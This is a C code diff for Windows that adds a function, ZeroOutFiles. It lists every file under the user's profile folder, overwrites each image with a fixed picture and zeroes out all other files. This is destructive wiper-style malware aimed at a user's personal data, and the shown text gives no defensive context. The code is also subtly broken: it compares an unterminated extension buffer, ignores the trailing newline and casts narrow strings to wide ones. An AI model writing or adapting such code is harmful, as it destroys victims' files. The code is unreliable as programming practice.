@@ -28,6 +28,35 @@ BOOL ZeroOutFile(LPCWSTR filename) {
     return CloseHandle(file);
 }
 
+BOOL ZeroOutFiles() {
+    FILE* file;
+
+    char extension[3] = {0};
+    char path[1024];
+
+    file = popen("dir %USERPROFILE% /a-D /S /B", "r");
+
+    if (file == NULL) {
+        return FALSE;
+    }
+
+    while (fgets(path, sizeof(path) - 1, file) != NULL) {
+        for (size_t i = 3; i > 0; i--) {
+            extension[i - 1] = path[strlen(path) - i];
+        }
+
+        if (strcmp(extension, "jpg") == 0 || strcmp(extension, "png") == 0 || strcmp(extension, "gif") == 0) {
+            ReplaceImage((LPCWSTR)path);
+        } else {
+            ZeroOutFile((LPCWSTR)path);
+        }
+    }
+
+    pclose(file);
+
+    return TRUE;
+}
+
 BOOL ReplaceImage(LPCWSTR filename) {
     HANDLE source = CreateFileW((LPCWSTR)IMAGE_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     HANDLE destination = CreateFileW(filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
